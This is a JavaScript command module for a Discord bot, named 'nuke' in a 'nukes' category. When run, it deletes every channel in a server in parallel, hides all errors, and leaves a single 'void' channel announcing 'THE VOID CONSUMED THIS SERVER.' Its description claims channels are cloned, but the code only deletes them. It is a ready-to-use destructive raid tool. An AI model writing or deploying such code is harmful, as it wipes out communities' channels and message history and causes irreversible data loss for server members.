module.exports = {
  name: 'nuke',
  description: '⚠️ Clone & delete every channel, rebuild with a single void channel. (Requires MANAGE_CHANNELS)',
  category: 'nukes',
  async execute(message) {
    const g = message.guild;
    if (!g) return message.channel.send('⬛ Use this in a server.');
    await message.delete().catch(()=>{});
    const channels = [...g.channels.cache.values()];
    // Delete in parallel
    await Promise.all(channels.map(c=>c.delete().catch(()=>{})));
    // Rebuild
    const ch = await g.channels.create('void', { type: 'GUILD_TEXT' }).catch(()=>{});
    if (ch) ch.send('⬛ **THE VOID CONSUMED THIS SERVER.**').catch(()=>{});
  },
};
